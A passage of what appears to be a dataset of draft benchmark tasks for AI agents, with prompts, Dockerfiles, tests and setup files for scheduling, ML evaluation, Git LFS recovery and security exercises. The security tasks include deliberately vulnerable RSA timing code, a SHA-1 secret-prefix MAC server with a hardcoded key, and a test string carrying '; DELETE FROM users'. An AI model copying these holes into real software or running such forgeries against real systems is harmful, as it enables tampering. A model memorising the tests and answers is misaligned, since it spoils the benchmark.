\""D\"", \""processing_time\"": 1, \""machine_id\"": 2, \""dependencies\"": [\""B\""]},\n    {\""id\"": \""E\"", \""processing_time\"": 3, \""machine_id\"": 1, \""dependencies\"": [\""A\"", \""B\""]},\n    {\""id\"": \""F\"", \""processing_time\"": 2, \""machine_id\"": 2, \""dependencies\"": [\""C\"", \""D\""]},\n    {\""id\"": \""G\"", \""processing_time\"": 3, \""machine_id\"": 0, \""dependencies\"": [\""E\""]},\n    {\""id\"": \""H\"", \""processing_time\"": 2, \""machine_id\"": 1, \""dependencies\"": [\""F\""]},\n    {\""id\"": \""I\"", \""processing_time\"": 1, \""machine_id\"": 2, \""dependencies\"": [\""G\"", \""H\""]},\n    {\""id\"": \""J\"", \""processing_time\"": 2, \""machine_id\"": 0, \""dependencies\"": [\""I\""]}\n  ]\n}"", ""scheduler.py"": ""import json\nimport time\nfrom itertools import permutations\nfrom typing import List, Dict, Tuple, Optional\n\nclass Job:\n    def __init__(self, job_id: str, processing_time: int, machine_id: int, dependencies: List[str] = None):\n        self.id = job_id\n        self.processing_time = processing_time\n        self.machine_id = machine_id\n        self.dependencies = dependencies or []\n    \n    def __repr__(self):\n        return f\""Job({self.id}, time={self.processing_time}, machine={self.machine_id})\""\n\nclass Schedule:\n    def __init__(self, machines: int):\n        self.machines = machines\n        self.machine_schedules = [[] for _ in range(machines)]\n        self.job_start_times = {}\n        self.job_end_times = {}\n        self.makespan = 0\n    \n    def add_job(self, job: Job, start_time: int):\n        self.job_start_times[job.id] = start_time\n        self.job_end_times[job.id] = start_time + job.processing_time\n        self.machine_schedules[job.machine_id].append((start_time, self.job_end_times[job.id], job))\n        self.makespan = max(self.makespan, self.job_end_times[job.id])\n    \n    def get_machine_available_time(self, machine_id: int) -> int:\n        if not self.machine_schedules[machine_id]:\n            return 0\n        return max(end_time for _, end_time, _ in self.machine_schedules[machine_id])\n    \n    def can_schedule_job(self, job: Job) -> Tuple[bool, int]:\n        # Check dependencies\n        earliest_start = 0\n        for dep in job.dependencies:\n            if dep not in self.job_end_times:\n                return False, -1\n            earliest_start = max(earliest_start, self.job_end_times[dep])\n        \n        # Check machine availability\n        machine_available = self.get_machine_available_time(job.machine_id)\n        start_time = max(earliest_start, machine_available)\n        \n        return True, start_time\n\nclass BruteForceScheduler:\n    def __init__(self, jobs: List[Job], num_machines: int):\n        self.jobs = jobs\n        self.num_machines = num_machines\n        self.best_schedule = None\n        self.best_makespan = float('inf')\n    \n    def find_optimal_schedule(self) -> Schedule:\n        # Try all possible job orderings (very slow!)\n        for perm in permutations(self.jobs):\n            schedule = self._build_schedule(perm)\n            if schedule and schedule.makespan < self.best_makespan:\n                self.best_makespan = schedule.makespan\n                self.best_schedule = schedule\n        \n        return self.best_schedule\n    \n    def _build_schedule(self, job_order: List[Job]) -> Optional[Schedule]:\n        schedule = Schedule(self.num_machines)\n        scheduled_jobs = set()\n        \n        for job in job_order:\n            can_schedule, start_time = schedule.can_schedule_job(job)\n            if not can_schedule:\n                # Dependencies not met in this ordering\n                return None\n            schedule.add_job(job, start_time)\n            scheduled_jobs.add(job.id)\n        \n        return schedule if len(scheduled_jobs) == len(self.jobs) else None\n\ndef load_jobs(filename: str) -> Tuple[List[Job], int]:\n    with open(filename, 'r') as f:\n        data = json.load(f)\n    \n    jobs = []\n    for job_data in data['jobs']:\n        job = Job(\n            job_data['id'],\n            job_data['processing_time'],\n            job_data['machine_id'],\n            job_data.get('dependencies', [])\n        )\n        jobs.append(job)\n    \n    return jobs, data['num_machines']\n\ndef main():\n    # Load test jobs\n    jobs, num_machines = load_jobs('test_jobs.json')\n    \n    print(f\""Scheduling {len(jobs)} jobs on {num_machines} machines...\"")\n    print(\""Using brute force approach (this will be slow for large inputs!)\"")\n    \n    scheduler = BruteForceScheduler(jobs, num_machines)\n    \n    start_time = time.time()\n    optimal_schedule = scheduler.find_optimal_schedule()\n    end_time = time.time()\n    \n    print(f\""\\nOptimal makespan: {optimal_schedule.makespan}\"")\n    print(f\""Time taken: {end_time - start_time:.2f} seconds\"")\n    \n    # Print schedule details\n    for i in range(num_machines):\n        print(f\""\\nMachine {i}:\"")\n        for start, end, job in sorted(optimal_schedule.machine_schedules[i]):\n            print(f\""  {job.id}: [{start}-{end}]\"")\n\nif __name__ == \""__main__\"":\n    main()""}",2025-07-21T19:21:44.119217,2025-07-22T17:50:26.027677+00:00
draft_dp_3d196526,hard,draft_dp_3d196526,machine-learning,Need to evaluate our recommendation model on MovieLens 100K. Get RMSE < 0.90 and MAE < 0.70. Save metrics to results/recommendation_evaluation.json with model details and performance stats.,machine-learning,python|data-science|numpy,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

WORKDIR /app

# Install Python and pip
RUN apt-get update && apt-get install -y python3 python3-pip python3-dev build-essential && rm -rf /var/lib/apt/lists/*

# Install required Python packages
RUN pip3 install --break-system-packages scikit-surprise pandas numpy pytest

# Create results directory
RUN mkdir -p results

# Copy and run MovieLens download script
COPY download_movielens.py /app/
RUN python3 download_movielens.py

CMD [""/bin/bash""]","import json
import os

def test_rmse_threshold():
    """"""Test that RMSE is below 0.90""""""
    results_path = ""/app/results/recommendation_evaluation.json""
    assert os.path.exists(results_path), ""Results file not found""
    
    with open(results_path, 'r') as f:
        results = json.load(f)
    
    assert 'rmse' in results, ""RMSE not found in results""
    assert results['rmse'] < 0.90, f""RMSE {results['rmse']} is not below 0.90""

def test_mae_threshold():
    """"""Test that MAE is below 0.70""""""
    results_path = ""/app/results/recommendation_evaluation.json""
    assert os.path.exists(results_path), ""Results file not found""
    
    with open(results_path, 'r') as f:
        results = json.load(f)
    
    assert 'mae' in results, ""MAE not found in results""
    assert results['mae'] < 0.70, f""MAE {results['mae']} is not below 0.70""","{""test_rmse_threshold"": 0.5, ""test_mae_threshold"": 0.5}","{""download_movielens.py"": ""import urllib.request\nimport zipfile\nimport os\n\n# Download MovieLens 100K dataset\nurl = \""https://files.grouplens.org/datasets/movielens/ml-100k.zip\""\nurllib.request.urlretrieve(url, \""ml-100k.zip\"")\n\n# Extract the dataset\nwith zipfile.ZipFile(\""ml-100k.zip\"", 'r') as zip_ref:\n    zip_ref.extractall(\"".\"")\n\n# Clean up zip file\nos.remove(\""ml-100k.zip\"")\n\nprint(\""MovieLens 100K dataset downloaded and extracted successfully!\"")""}",2025-07-22T10:49:09.276244+00:00,2025-07-22T10:52:42.831866+00:00
draft_dp_d64bd207,medium,draft_dp_d64bd207,machine-learning,"Need to evaluate our QA model on SQuAD 2.0 validation set. Get F1 > 80 and EM > 75, save detailed results to results/squad_evaluation.json.",machine-learning,python|machine-learning,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /workspace

RUN pip install --no-cache-dir \
    transformers \
    datasets \
    torch \
    evaluate \
    numpy

COPY config.json /workspace/
COPY evaluate_squad.py /workspace/

RUN mkdir -p /workspace/results

RUN chmod +x /workspace/evaluate_squad.py

CMD [""/bin/bash""]","import os
import json

def test_squad_evaluation_results_exist():
    """"""Test that the evaluation results file was created with valid JSON.""""""
    results_path = '/workspace/results/squad_evaluation.json'
    assert os.path.exists(results_path), f""Results file {results_path} does not exist""
    
    with open(results_path, 'r') as f:
        data = json.load(f)
    
    # Check required fields exist
    required_fields = ['f1', 'exact_match', 'total']
    for field in required_fields:
        assert field in data, f""Required field '{field}' missing from results""
    
    # Check numeric values
    assert isinstance(data['f1'], (int, float)), ""F1 score must be numeric""
    assert isinstance(data['exact_match'], (int, float)), ""EM score must be numeric""
    assert isinstance(data['total'], int), ""Total count must be integer""

def test_squad_performance_requirements():
    """"""Test that the model meets the required F1 > 80 and EM > 75 performance.""""""
    results_path = '/workspace/results/squad_evaluation.json'
    
    with open(results_path, 'r') as f:
        data = json.load(f)
    
    f1_score = data['f1']
    em_score = data['exact_match']
    
    assert f1_score > 80, f""F1 score {f1_score} does not meet requirement (> 80)""
    assert em_score > 75, f""EM score {em_score} does not meet requirement (> 75)""","{""test_squad_evaluation_results_exist"": 0.3, ""test_squad_performance_requirements"": 0.7}","{""evaluate_squad.py"": ""#!/usr/bin/env python3\nimport json\nimport os\nfrom transformers import pipeline\nfrom datasets import load_dataset\n\ndef load_config():\n    with open('config.json', 'r') as f:\n        return json.load(f)\n\ndef main():\n    config = load_config()\n    \nif __name__ == \""__main__\"":\n    main()"", ""config.json"": ""{\n  \""model_name\"": \""deepset/roberta-base-squad2\"",\n  \""dataset\"": \""squad_v2\"",\n  \""batch_size\"": 16,\n  \""max_seq_length\"": 384,\n  \""doc_stride\"": 128,\n  \""output_dir\"": \""results\""\n}""}",2025-07-22T08:59:46.105221,2025-07-22T17:49:40.729182+00:00
draft_dp_b1745638,extremely_hard,draft_dp_b1745638,security,The RSA service in vulnerable_rsa.py has timing side-channels in its modular exponentiation. Write a timing attack in attack.py that recovers at least 32 bits of the 64-bit secret exponent with >90% accuracy using <1000 oracle queries.,security,python|security|algorithms,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

RUN pip install numpy scipy

COPY vulnerable_rsa.py /app/

CMD [""/bin/bash""]","import os
import subprocess
import sys

def test_timing_attack_accuracy():
    """"""Test that the timing attack recovers at least 32 bits with >90% accuracy""""""
    result = subprocess.run([sys.executable, '-c', '''
import os
import sys
sys.path.append(""/app"")

try:
    from attack import recover_exponent
    from vulnerable_rsa import create_test_instance
    
    # Test with known instance
    vulnerable, secret_exp = create_test_instance(64)
    oracle = vulnerable.get_oracle_func()
    
    # Run the attack
    recovered_bits = recover_exponent(2, vulnerable.modulus, oracle, 64)
    
    # Check accuracy for first 32 bits
    correct_bits = 0
    for i in range(32):
        if (secret_exp >> (63-i)) & 1 == recovered_bits[i]:
            correct_bits += 1
    
    accuracy = correct_bits / 32
    queries = vulnerable.get_query_count()
    
    print(f""Accuracy: {accuracy:.2%}, Queries: {queries}"")
    
    # Must have >90% accuracy and <1000 queries
    if accuracy > 0.9 and queries < 1000:
        sys.exit(0)
    else:
        sys.exit(1)
        
except Exception as e:
    print(f""Error: {e}"")
    sys.exit(1)
'''], capture_output=True, text=True, timeout=120)
    
    assert result.returncode == 0, f""Attack failed: {result.stdout} {result.stderr}""","{""test_timing_attack_accuracy"": 1.0}","{""vulnerable_rsa.py"": ""import time\n\nclass VulnerableRSA:\n    def __init__(self, secret_exponent, modulus):\n        self.secret_exponent = secret_exponent\n        self.modulus = modulus\n        self.oracle_queries = 0\n    \n    def modular_exp_timed(self, base):\n        \""\""\""Vulnerable square-and-multiply with timing side-channel\""\""\""\n        self.oracle_queries += 1\n        start_time = time.perf_counter_ns()\n        \n        result = 1\n        exponent = self.secret_exponent\n        base = base % self.modulus\n        \n        bit_length = exponent.bit_length()\n        \n        for i in range(bit_length - 1, -1, -1):\n            result = (result * result) % self.modulus\n            \n            if (exponent >> i) & 1:\n                result = (result * base) % self.modulus\n                time.sleep(0.0001)\n        \n        end_time = time.perf_counter_ns()\n        return end_time - start_time\n    \n    def get_oracle_func(self):\n        \""\""\""Returns a function that can be used as oracle_func in the attack\""\""\""\n        return lambda base: self.modular_exp_timed(base)\n    \n    def get_query_count(self):\n        return self.oracle_queries\n\n\ndef create_test_instance(bit_length=64):\n    \""\""\""Create a test instance with random exponent\""\""\""\n    import random\n    modulus = 0xc7f61058f0ff17b9\n    secret_exponent = random.getrandbits(bit_length)\n    return VulnerableRSA(secret_exponent, modulus), secret_exponent""}",2025-07-22T11:02:25.926311+00:00,2025-07-22T11:02:25.948394+00:00
draft_dp_fbcf5d42,medium,draft_dp_fbcf5d42,security,The MAC verification server at localhost:5000 is using SHA-1(secret || message) which is vulnerable to length extension. Need to implement forge_mac() in attack.py to extend messages without knowing the 16-byte secret.,security,python|security|encryption,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

# Install Flask and requests
RUN pip install flask requests

# Copy application files
COPY server.py /app/
COPY sha1_utils.py /app/
COPY attack.py /app/
COPY test_client.py /app/

# Make test client executable
RUN chmod +x test_client.py

# Start the server in background when container starts
RUN echo '#!/bin/bash\npython /app/server.py &\nsleep 2\nexec /bin/bash' > /start.sh && \
    chmod +x /start.sh

CMD [""/start.sh""]","import subprocess
import requests
import hashlib
import json
import time
import sys
import os

def test_forge_mac_works():
    """"""Test that the length extension attack successfully forges valid MACs""""""
    # Wait for server to be ready
    for _ in range(10):
        try:
            requests.get('http://localhost:5000')
            break
        except:
            time.sleep(0.5)
    
    # Import the attack module
    sys.path.insert(0, '/app')
    import attack
    
    # Test case 1: Basic forgery
    SECRET = b'supersecretkey16'
    original_message = b'Transfer $100 to Alice'
    
    # Calculate original MAC (what server would produce)
    h = hashlib.sha1()
    h.update(SECRET)
    h.update(original_message)
    original_mac = h.hexdigest()
    
    # Attempt forgery
    extension = b' and $1000 to Eve'
    forged_message, forged_mac = attack.forge_mac(original_message, original_mac, extension)
    
    # Verify the forged MAC is accepted by the server
    response = requests.post('http://localhost:5000/verify',
                           json={'message': forged_message.hex(), 'mac': forged_mac})
    assert response.json()['valid'] == True, ""Forged MAC was not accepted by server""
    
    # Verify the forged message contains the extension
    assert extension in forged_message, ""Forged message doesn't contain the extension""
    
    # Verify padding is included
    assert b'\x80' in forged_message, ""Forged message doesn't include SHA-1 padding""

def test_multiple_message_lengths():
    """"""Test that attack works with different original message lengths""""""
    sys.path.insert(0, '/app')
    import attack
    
    SECRET = b'supersecretkey16'
    test_messages = [
        b'Pay Bob $50',  # Short message
        b'Authorization: Bearer token1234567890abcdef',  # Medium message  
        b'The quick brown fox jumps over the lazy dog multiple times'  # Longer message
    ]
    
    for original_message in test_messages:
        # Calculate original MAC
        h = hashlib.sha1()
        h.update(SECRET)
        h.update(original_message)
        original_mac = h.hexdigest()
        
        # Forge with extension
        extension = b'; DELETE FROM users'
        forged_message, forged_mac = attack.forge_mac(original_message, original_mac, extension)
        
        # Verify forgery works
        response = requests.post('http://localhost:5000/verify',
                               json={'message': forged_message.hex(), 'mac': forged_mac})
        assert response.json()['valid'] == True, f""Failed for message length {len(original_message)}""","{""test_forge_mac_works"": 0.6, ""test_multiple_message_lengths"": 0.4}","{""server.py"": ""#!/usr/bin/env python3\nimport hashlib\nfrom flask import Flask, request, jsonify\nimport os\n\napp = Flask(__name__)\n\n# Fixed secret key (16 bytes)\nSECRET_KEY = b'supersecretkey16'\n\n@app.route('/verify', methods=['POST'])\ndef verify_mac():\n    data = request.get_json()\n    message = bytes.fromhex(data['message'])\n    provided_mac = data['mac']\n    \n    # Calculate MAC using SHA-1(secret || message)\n    h = hashlib.sha1()\n    h.update(SECRET_KEY)\n    h.update(message)\n    calculated_mac = h.hexdigest()\n    \n    if calculated_mac == provided_mac:\n        return jsonify({'valid': True})\n    else:\n        return jsonify({'valid': False})\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=5000)"", ""sha1_utils.py"": ""import struct\nimport hashlib\n\nclass SHA1State:\n    \""\""\""SHA-1 implementation that allows setting internal state\""\""\""\n    \n    def __init__(self):\n        self.h = [0x67452301, 0xEFCDAB89, 0x98BADCFE, 0x10325476, 0xC3D2E1F0]\n        self.message_byte_length = 0\n        \n    def set_state(self, h_values, message_byte_length):\n        \""\""\""Set internal state from existing hash\""\""\""\n        self.h = list(h_values)\n        self.message_byte_length = message_byte_length\n        \n    def _left_rotate(self, n, b):\n        return ((n << b) | (n >> (32 - b))) & 0xffffffff\n        \n    def _process_chunk(self, chunk):\n        \""\""\""Process a 512-bit chunk\""\""\""\n        w = [0] * 80\n        \n        # Break chunk into sixteen 32-bit big-endian words\n        for i in range(16):\n            w[i] = struct.unpack('>I', chunk[i*4:(i+1)*4])[0]\n            \n        # Extend the sixteen 32-bit words into eighty 32-bit words\n        for i in range(16, 80):\n            w[i] = self._left_rotate(w[i-3] ^ w[i-8] ^ w[i-14] ^ w[i-16], 1)\n            \n        # Initialize working variables\n        a, b, c, d, e = self.h\n        \n        # Main loop\n        for i in range(80):\n            if 0 <= i <= 19:\n                f = (b & c) | ((~b) & d)\n                k = 0x5A827999\n            elif 20 <= i <= 39:\n                f = b ^ c ^ d\n                k = 0x6ED9EBA1\n            elif 40 <= i <= 59:\n                f = (b & c) | (b & d) | (c & d)\n                k = 0x8F1BBCDC\n            elif 60 <= i <= 79:\n                f = b ^ c ^ d\n                k = 0xCA62C1D6\n                \n            temp = (self._left_rotate(a, 5) + f + e + k + w[i]) & 0xffffffff\n            e = d\n            d = c\n            c = self._left_rotate(b, 30)\n            b = a\n            a = temp\n            \n        # Update hash values\n        self.h[0] = (self.h[0] + a) & 0xffffffff\n        self.h[1] = (self.h[1] + b) & 0xffffffff\n        self.h[2] = (self.h[2] + c) & 0xffffffff\n        self.h[3] = (self.h[3] + d) & 0xffffffff\n        self.h[4] = (self.h[4] + e) & 0xffffffff\n        \n    def update(self, message):\n        \""\""\""Update hash with new message bytes\""\""\""\n        message = bytearray(message)\n        self.message_byte_length += len(message)\n        \n        # Process complete 512-bit chunks\n        for i in range(0, len(message) - (len(message) % 64), 64):\n            self._process_chunk(message[i:i+64])\n            \n        # Store remaining bytes for finalization\n        self.remaining = message[len(message) - (len(message) % 64):]\n        \n    def finalize(self):\n        \""\""\""Finalize and return hash\""\""\""\n        # Start with remaining bytes\n        message = bytearray(self.remaining)\n        message_bit_length = self.message_byte_length * 8\n        \n        # Append padding\n        message.append(0x80)\n        while len(message) % 64 != 56:\n            message.append(0x00)\n            \n        # Append length as 64-bit big-endian\n        message += struct.pack('>Q', message_bit_length)\n        \n        # Process final chunk(s)\n        for i in range(0, len(message), 64):\n            self._process_chunk(message[i:i+64])\n            \n        # Return hash as hex string\n        return ''.join(f'{h:08x}' for h in self.h)\n\ndef parse_sha1_hash(hash_hex):\n    \""\""\""Parse SHA-1 hash string into internal state values\""\""\""\n    h_values = []\n    for i in range(0, 40, 8):\n        h_values.append(int(hash_hex[i:i+8], 16))\n    return h_values\n\ndef calculate_padding(message_length):\n    \""\""\""Calculate SHA-1 padding for a message of given length in bytes\""\""\""\n    padding = bytearray()\n    padding.append(0x80)\n    \n    # Calculate number of zeros needed\n    zeros_needed = (55 - message_length) % 64\n    padding.extend(b'\\x00' * zeros_needed)\n    \n    # Append length as 64-bit big-endian\n    bit_length = message_length * 8\n    padding.extend(struct.pack('>Q', bit_length))\n    \n    return bytes(padding)"", ""attack.py"": ""import struct\nfrom sha1_utils import SHA1State, parse_sha1_hash, calculate_padding\n\ndef forge_mac(original_message, original_mac, extension):\n    \""\""\""\n    Forge a valid MAC for an extended message using length extension attack.\n    \n    Args:\n        original_message: The original message (bytes)\n        original_mac: The MAC of secret || original_message (hex string)\n        extension: The extension to append (bytes)\n        \n    Returns:\n        tuple: (forged_message, forged_mac) where forged_message includes padding\n    \""\""\""\n    # TODO: Implement length extension attack\n    # Hint: The secret is 16 bytes long\n    \n    return b'', ''"", ""test_client.py"": ""#!/usr/bin/env python3\nimport requests\nimport hashlib\n\n# Example of creating a valid MAC (this simulates what the server does internally)\nSECRET = b'supersecretkey16'\noriginal_message = b'Transfer $100 to Alice'\n\nh = hashlib.sha1()\nh.update(SECRET)\nh.update(original_message)\noriginal_mac = h.hexdigest()\n\nprint(f\""Original message: {original_message.decode()}\"")\nprint(f\""Original MAC: {original_mac}\"")\nprint()\n\n# Verify it's valid\nresponse = requests.post('http://localhost:5000/verify', \n                        json={'message': original_message.hex(), 'mac': original_mac})\nprint(f\""Verification result: {response.json()}\"")\nprint()\nprint(\""Now run your attack.py to forge an extended message!\"")""}",2025-07-22T10:45:54.808284+00:00,2025-07-22T10:45:54.833918+00:00
draft_dp_be454682,medium,draft_dp_be454682,software-engineering,Need a REST API on port 5000 with a /moving-average endpoint that calculates simple moving averages. It should take query params: prices (comma-separated numbers) and window (integer for period size). Return JSON array with nulls for first n-1 values.,software-engineering,python|api|algorithms,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

RUN pip install flask requests

COPY app.py /app/

EXPOSE 5000","import subprocess
import json
import time

def test_moving_average_calculation():
    """"""Test that the moving average endpoint calculates correctly.""""""
    # Give Flask time to start
    time.sleep(2)
    
    # Test with prices ""10,20,30,40,50"" and window 3
    result = subprocess.run([
        'curl', '-s', 
        'http://localhost:5000/moving-average?prices=10,20,30,40,50&window=3'
    ], capture_output=True, text=True)
    
    assert result.returncode == 0, ""Curl request failed""
    
    # Parse JSON response
    response_data = json.loads(result.stdout)
    expected = [None, None, 20.0, 30.0, 40.0]
    
    assert response_data == expected, f""Expected {expected}, got {response_data}""

def test_error_handling():
    """"""Test that missing parameters return 400 status code.""""""
    # Give Flask time to start
    time.sleep(2)
    
    # Test missing prices parameter
    result = subprocess.run([
        'curl', '-s', '-w', '\\n%{http_code}',
        'http://localhost:5000/moving-average?window=3'
    ], capture_output=True, text=True)
    
    lines = result.stdout.strip().split('\n')
    status_code = lines[-1]
    
    assert status_code == '400', f""Expected 400 status code, got {status_code}""","{""test_moving_average_calculation"": 0.7, ""test_error_handling"": 0.3}","{""app.py"": ""from flask import Flask, request, jsonify\n\napp = Flask(__name__)\n\n@app.route('/')\ndef index():\n    return \""Stock Price API\""\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=5000)""}",2025-07-22T11:06:07.759025+00:00,2025-07-22T11:06:07.787280+00:00
draft_dp_23769914,extremely_hard,draft_dp_23769914,software-engineering,The ML models in the repo are showing as LFS pointer files after yesterday's migration. Need to recover the actual model weights - the customer_segmentation.h5 and fraud_detection.pt files are critical for production.,software-engineering,git|file-recovery|troubleshooting,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

WORKDIR /app

# Install Git LFS and required packages
RUN apt-get update && apt-get install -y \
    git-lfs \
    python3 \
    xxd \
    file \
    && rm -rf /var/lib/apt/lists/*

# Copy setup files
COPY .gitattributes /.gitattributes
COPY customer_segmentation.h5.pointer /customer_segmentation.h5.pointer
COPY fraud_detection.pt.pointer /fraud_detection.pt.pointer
COPY setup_repo.sh /setup_repo.sh

# Make setup script executable and run it
RUN chmod +x /setup_repo.sh && /setup_repo.sh

# Clean up setup files
RUN rm -f /.gitattributes /customer_segmentation.h5.pointer /fraud_detection.pt.pointer /setup_repo.sh

WORKDIR /app","import os
import subprocess

def test_models_are_recovered():
    """"""Test that model files contain actual binary data, not LFS pointers""""""
    # Check customer segmentation model
    with open('/app/models/customer_segmentation.h5', 'rb') as f:
        content = f.read(100)
    assert not content.startswith(b'version https://git-lfs'), ""customer_segmentation.h5 is still an LFS pointer""
    assert os.path.getsize('/app/models/customer_segmentation.h5') > 10 * 1024 * 1024, ""customer_segmentation.h5 is too small""
    
    # Check fraud detection model  
    with open('/app/models/fraud_detection.pt', 'rb') as f:
        content = f.read(100)
    assert not content.startswith(b'version https://git-lfs'), ""fraud_detection.pt is still an LFS pointer""
    assert os.path.getsize('/app/models/fraud_detection.pt') > 10 * 1024 * 1024, ""fraud_detection.pt is too small""

def test_git_lfs_tracking():
    """"""Test that recovered files are properly tracked by Git LFS""""""
    result = subprocess.run(
        ['git', 'lfs', 'ls-files'],
        cwd='/app',
        capture_output=True, text=True
    )
    assert result.returncode == 0, f""Git LFS command failed: {result.stderr}""
    assert 'customer_segmentation.h5' in result.stdout, ""customer_segmentation.h5 not tracked by LFS""
    assert 'fraud_detection.pt' in result.stdout, ""fraud_detection.pt not tracked by LFS""","{""test_models_are_recovered"": 0.7, ""test_git_lfs_tracking"": 0.3}","{""setup_repo.sh"": ""#!/bin/bash\nset -e\n\ncd /app\n\n# Initialize git repo and configure\ngit init\ngit config user.email \""dev@company.com\""\ngit config user.name \""Developer\""\n\n# Create directory structure\nmkdir -p models training\n\n# Copy gitattributes\ncp /.gitattributes .gitattributes\n\n# Initial commit with gitattributes\ngit add .gitattributes\ngit commit -m \""Initial commit with LFS tracking\""\n\n# Initialize Git LFS\ngit lfs install\n\n# Create dummy binary model files\n# Customer segmentation model - 15MB\ndd if=/dev/urandom of=/tmp/customer_segmentation.h5 bs=1M count=15 2>/dev/null\n\n# Fraud detection model - 20MB  \ndd if=/dev/urandom of=/tmp/fraud_detection.pt bs=1M count=20 2>/dev/null\n\n# Store models in git's object database (simulating LFS storage)\nMODEL1_HASH=$(git hash-object -w /tmp/customer_segmentation.h5)\nMODEL2_HASH=$(git hash-object -w /tmp/fraud_detection.pt)\n\n# Add pointer files to the repo (simulating broken LFS state)\ncp /customer_segmentation.h5.pointer models/customer_segmentation.h5\ncp /fraud_detection.pt.pointer models/fraud_detection.pt\n\ngit add models/\ngit commit -m \""Add ML models\""\n\n# Simulate a filter-branch operation that broke LFS\ngit tag pre-migration\necho \""# ML Models Repository\"" > README.md\ngit add README.md\ngit commit -m \""Add README after migration\""\n\n# Create git lfs track info but without actual objects (simulating broken state)\ngit lfs track \""*.h5\""\ngit lfs track \""*.pt\""\n\n# Remove temp files\nrm -f /tmp/customer_segmentation.h5 /tmp/fraud_detection.pt\n\necho \""Repository setup complete. Models are now LFS pointers without backing objects.\""\necho \""Git objects for models are stored at:\""\necho \""  - customer_segmentation.h5: $MODEL1_HASH\""\necho \""  - fraud_detection.pt: $MODEL2_HASH\"""", ""customer_segmentation.h5.pointer"": ""version https://git-lfs.github.com/spec/v1\noid sha256:a8e5f3b2c1d4e6f8a9b3c5d7e9f1a3b5c7d9e1f3a5b7c9d1e3f5a7b9c1d3e5f7\nsize 15728640"", "".gitattributes"": ""*.h5 filter=lfs diff=lfs merge=lfs -text\n*.pt filter=lfs diff=lfs merge=lfs -text\n*.pth filter=lfs diff=lfs merge=lfs -text"", ""fraud_detection.pt.pointer"": ""version https://git-lfs.github.com/spec/v1\noid sha256:b7f4d2a1c3e5f7a9b1d3e5f7a9c1e3f5b7d9f1a3c5e7f9a1d3f5b7d9f1a3e5\nsize 20971520""}",2025-07-22T11:05:47.025147+00:00,2025-07-22T11:16:18.308778+00:00
draft_dp_bcd2c3da,medium,draft_dp_bcd2c3da,mathematics,The game server's RNG was compromised. I captured 10 consecutive outputs in observations.txt. Figure out the LCG parameters (m=2^32) and predict the next 20 numbers in predictions.txt.,mathematics,python|algorithms|pattern-recognition,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

# Copy the observations file
COPY observations.txt /app/

# The agent needs to analyze this file and create predictions.txt and parameters.txt","import os
import subprocess

def test_predictions_correct():
    """"""Test that the predicted numbers match the expected LCG sequence.""""""
    # Expected predictions (pre-computed from the LCG with discovered parameters)
    expected = [
        2462349969, 4050121404, 2647207659, 4249548622, 509908565,
        2310894512, 55964495, 1769261154, 2965777497, 2161879524,
        3834342387, 4014031030, 3024994461, 779438424, 2100608215,
        207172682, 2198214433, 2469283340, 4242360827, 2024322846
    ]
    
    assert os.path.exists('/app/predictions.txt'), ""predictions.txt not found""
    
    with open('/app/predictions.txt', 'r') as f:
        predictions = [int(line.strip()) for line in f if line.strip()]
    
    assert len(predictions) == 20, f""Expected 20 predictions, got {len(predictions)}""
    
    for i, (pred, exp) in enumerate(zip(predictions, expected)):
        assert pred == exp, f""Prediction {i+1} incorrect: got {pred}, expected {exp}""

def test_parameters_correct():
    """"""Test that the discovered LCG parameters are correct.""""""
    assert os.path.exists('/app/parameters.txt'), ""parameters.txt not found""
    
    with open('/app/parameters.txt', 'r') as f:
        content = f.read().strip()
    
    # Parse parameters
    params = {}
    for line in content.split('\n'):
        if '=' in line:
            key, value = line.split('=')
            params[key.strip()] = int(value.strip())
    
    assert 'a' in params, ""Parameter 'a' not found""
    assert 'c' in params, ""Parameter 'c' not found""
    
    # Verify parameters are correct by checking if they produce the expected sequence
    # Read observations to get starting value
    with open('/app/observations.txt', 'r') as f:
        observations = [int(line.strip()) for line in f if line.strip()]
    
    # Test the LCG formula with discovered parameters
    a, c = params['a'], params['c']
    m = 2**32
    x = observations[0]
    
    for i in range(1, len(observations)):
        x = (a * x + c) % m
        assert x == observations[i], f""LCG parameters don't match observation {i+1}""","{""test_predictions_correct"": 0.7, ""test_parameters_correct"": 0.3}","{""observations.txt"": ""1085764415\n3738298258\n3432899017\n2500493460\n2342941411\n3721673446\n3491992845\n2313532168\n1043741383\n3188341114""}",2025-07-22T10:45:46.433884+00:00,2025-07-22T17:54:28.767106+00:00
draft_dp_0c77f108,medium,draft_dp_0c77f108,software-engineering,The warehouse robot controller is timing out with multiple delivery tasks. Need to implement A* pathfinding that handles dynamic obstacles and completes at least 20 deliveries without collisions.,software-engineering,python|algorithms|pathfinding,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

# Copy warehouse simulation files
COPY warehouse_server.py /app/
COPY robot_controller.py /app/

# Install dependencies
RUN pip install requests matplotlib

# Make scripts executable
RUN chmod +x warehouse_server.py robot_controller.py

# Start warehouse server in background
RUN echo '#!/bin/bash\npython /app/warehouse_server.py &\nsleep 2\nexec ""$@""' > /app/start.sh && \
    chmod +x /app/start.sh

ENTRYPOINT [""/app/start.sh""]
CMD [""/bin/bash""]","import subprocess
import json
import time

def test_robot_completes_deliveries():
    """"""Test that the robot successfully completes at least 20 deliveries""""""
    # Give time for any running controller to complete
    time.sleep(2)
    
    # Check stats from the server
    result = subprocess.run(
        ['curl', '-s', 'http://localhost:8080/stats'],
        capture_output=True,
        text=True
    )
    
    assert result.returncode == 0, ""Failed to get stats from server""
    
    stats = json.loads(result.stdout)
    deliveries = stats.get('total_deliveries', 0)
    
    assert deliveries >= 20, f""Expected at least 20 deliveries, got {deliveries}""

def test_robot_avoids_collisions():
    """"""Test that the robot has minimal collisions""""""
    result = subprocess.run(
        ['curl', '-s', 'http://localhost:8080/stats'],
        capture_output=True,
        text=True
    )
    
    assert result.returncode == 0, ""Failed to get stats from server""
    
    stats = json.loads(result.stdout)
    collisions = stats.get('total_collisions', 0)
    
    # Allow some collisions but not too many
